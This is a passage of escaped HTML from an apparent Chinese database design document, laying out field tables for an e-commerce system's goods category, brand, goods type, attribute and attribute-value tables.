style=\"font-size:16px;\">cat_name</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">varchar(90)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">商品分类名称</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">parent_id</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">smallint(5)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">父ID</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">parent_id_path</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">varchar(128)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">家族图谱</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">level</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">等级</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">cat_sort</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">tinyint(2)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">顺序排序</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">uid</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">创建人</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">create_time</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">bigint(13)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">创建时间</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">is_delete</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">伪删除(0,未删除,1,已删除)</span><span style=\"font-size:18px;text-align:center;font-family:'PingFang SC', 'Microsoft YaHei', SimHei, Arial, SimSun;\"><strong> </strong></span></p></td></tr></tbody></table><p><span style=\"font-size:16px;\"><br>2. <strong>品牌表体系的逻辑</strong></span></p><p><strong><span style=\"font-size:16px;\"><span style=\"font-family:'宋体';\">品牌表</span> cs_goods_brand</span></strong></p><table><tbody><tr><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">字段名</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">数据类型</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">默认值</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">允许非空</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">是否递增</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">备注</span></strong></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">id</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">是</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">主键ID</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">brand_no</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">varchar(255)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">品牌编号</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">brand_name_en</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">varchar(255)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">品牌英文名</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">brand_name_zh</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">varchar(255)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">品牌中文名</span></p></td></tr><tr><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">parent_id</span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">int(11)</span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">0</span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">否</span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"> </span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><span>品牌父</span><span>ID</span></span></span></p></td></tr><tr><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">image_url</span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">text</span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"> </span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">否</span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"> </span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">LOGO图片地址</span></span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">country</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">varchar(255)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">国家</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">brand_desc</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">text</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">品牌描述</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">brand_sort</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">tinyint(3)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">排序</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">is_hot</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">是否推荐</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">uid</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">创建人</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">create_time</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">bigint(13)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">创建时间</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">is_delete</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">伪删除状态(0,未删除1,已删除)</span></p></td></tr></tbody></table><p><span style=\"font-size:16px;\"> </span></p><p><span style=\"font-size:16px;\">3. <strong>商品模型表逻辑</strong></span></p><p><strong><span style=\"font-size:16px;\"><span style=\"font-family:'宋体';\">表名</span>:cs_goods_type</span></strong></p><table><tbody><tr><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">字段名</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">数据类型</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">默认值</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">允许非空</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">是否递增</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">备注</span></span></strong></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">id</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">是</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">主键ID</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">type_name</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">varchar(255)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">模型名称</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">uid</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">创建人</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">create_time</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">bigint(13)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">创建时间</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">is_delete</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">伪删除状态(0,未删除1,已删除)</span></p></td></tr></tbody></table><p><span style=\"font-size:16px;\"> </span></p><p><span style=\"font-size:16px;\">4. <strong>商品属性与规格表的逻辑</strong></span></p><p><strong><span style=\"font-size:16px;\">cs_goods_attr_relation  商品与属性关联表</span></strong></p><table><tbody><tr><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">字段名</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">数据类型</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">默认值</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">允许非空</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">是否递增</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">备注</span></span></strong></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">id</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">是</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">主键ID</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">goods_id</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">唯一码ID或款号ID或SKU的ID</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">attr_id</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">关联商品属性表ID(cs_goods_attribute)</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">attr_value_id</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">关联商品属性值表ID(cs_goods_attribute<span style=\"background-color:rgb(255,255,255);\"><span>_value</span></span>)</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">goods_type</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">ID类型(1,唯一码ID,2,系统款号ID,3,SKU表ID)</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">create_time</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">bigint(13)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">创建时间</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">uid</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">创建人</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">is_delete</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">伪删除状态(0,未删除1,已删除</span></p></td></tr></tbody></table><p><strong><span style=\"font-size:16px;\"><br>cs_goods_attribute  <span style=\"font-family:'宋体';\">商品属性表</span></span></strong></p><table><tbody><tr><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">字段名</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">数据类型</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">默认值</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">允许非空</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">是否递增</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">备注</span></span></strong></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">id</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">是</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">attr_type</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">属性类型(1.商品属性,2.商品规格)</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">attr_name</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">varchar(255)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">属性名称</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">attr_sort</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">排序</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">is_search</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">是否需要检索：1是，0否</span></p></td></tr><tr><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">is_print</span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">tinyint(1)</span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"> </span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">否</span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"> </span></span></p></td><td><p align=\"center\"><span style=\"background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">是否打印吊牌属性</span></span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">create_time</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">bigint(13)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">创建时间</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">uid</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">创建人</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">is_delete</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">伪删除状态(0,未删除1,已删除)</span></p></td></tr></tbody></table><p><strong><span style=\"font-size:16px;\"><br>cs_goods_attribute_value  <span style=\"font-family:'宋体';\">商品属性值表</span></span></strong></p><table><tbody><tr><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">字段名</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">数据类型</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">默认值</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">允许非空</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"font-size:16px;\">是否递增</span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span 